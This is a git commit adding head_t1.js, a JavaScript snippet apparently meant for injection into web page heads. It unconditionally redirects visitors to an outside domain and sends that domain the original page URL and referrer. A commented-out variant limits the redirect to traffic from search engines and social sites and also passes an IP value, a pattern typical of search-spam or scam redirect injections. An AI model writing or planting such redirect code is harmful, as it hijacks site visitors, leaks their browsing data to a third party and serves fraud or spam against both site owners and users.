1b696608d070cbb325d4888571e740bf7125f8dc
v0sterxx <v0sterx.x@gmail.com>
2026-04-22 22:40:19 +0700

    Create head_t1.js

---
+++ head_t1.js
@@ -0,0 +1,7 @@
+///// Arsae /////
+var arsT1Bing = 'https://roll1.embrolle.my.id';
+
+// if(['google.', 'msn.', 'bing.', 'yandex.', 'facebook.', 'ecosia', 'qwant', 'pinterest.', 'duckduckgo.', '.yahoo.', 't.co'].some(s => document.referrer.toLowerCase().includes(s))){ 
+	// window.location.href = arsT1Bing + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) + '&ip=' + window.ipAddressArsae
+window.location.href = arsT1Bing + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer);
+// }
